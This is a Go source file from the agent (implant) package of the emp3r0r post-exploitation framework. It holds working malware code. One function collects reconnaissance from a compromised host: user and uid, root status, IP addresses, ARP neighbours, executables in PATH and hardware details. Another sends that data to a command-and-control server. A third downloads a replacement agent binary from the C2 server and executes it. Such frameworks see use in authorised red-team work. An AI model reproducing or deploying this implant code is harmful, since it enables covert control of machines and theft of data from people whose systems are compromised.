package agent

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/jaypipes/ghw"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// is the agent alive?
// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
func IsAgentAlive(c net.Conn) bool {
	log.Println("Testing if agent is alive...")
	defer c.Close()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for ctx.Err() == nil {
			n, err := r.Read(buf[:])
			if err != nil {
				log.Printf("Read error: %v", err)
				cancel()
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for ctx.Err() == nil {
		_, err := c.Write([]byte(fmt.Sprintf("%d", os.Getpid())))
		if err != nil {
			log.Printf("Write error: %v, agent is likely to be dead", err)
			break
		}
		resp := <-replyFromAgent
		if strings.Contains(resp, "kill yourself") {
			log.Printf("Agent told me to die (%d)", os.Getpid())
			os.Exit(0)
		}
		if strings.Contains(resp, "emp3r0r") {
			log.Println("Yes it's alive")
			return true
		}
		util.TakeASnap()
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *emp3r0r_data.MsgTunData) error {
	var out = json.NewEncoder(emp3r0r_data.CCMsgConn)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
	log.Println("Collecting system info for checking in")
	var info emp3r0r_data.AgentSystemInfo
	osinfo := GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
	if err != nil {
		log.Printf("ProductInfo: %v", err)
	}

	RuntimeConfig.AgentTag = util.GetHostID(info.Product, RuntimeConfig.AgentUUID)
	info.Tag = RuntimeConfig.AgentTag // use hostid
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = emp3r0r_data.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct(info.Product)
	info.Container = CheckContainer()
	setC2Transport()
	info.Transport = emp3r0r_data.Transport

	// have root?
	info.HasRoot = HasRoot()

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)

	// has internet?
	info.HasInternet = tun.HasInternetAccess(tun.MicrosoftNCSIURL)

	// IP address?
	info.IPs = tun.IPa()

	// arp -a ?
	info.ARP = tun.IPNeigh()

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}

func Upgrade(checksum string) (out string) {
	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
	_, err := DownloadViaCC("agent", tempfile)
	if err != nil {
		return fmt.Sprintf("Error: Download agent: %v", err)
	}
	download_checksum := tun.SHA256SumFile(tempfile)
	if checksum != download_checksum {
		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
	}
	err = os.Chmod(tempfile, 0755)
	if err != nil {
		return fmt.Sprintf("Error: chmod %s: %v", tempfile, err)
	}
	cmd := exec.Command(tempfile)
	cmd.Env = append(os.Environ(), "REPLACE_AGENT=1")
	err = cmd.Start()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	return fmt.Sprintf("Agent started with PID %d", cmd.Process.Pid)
}
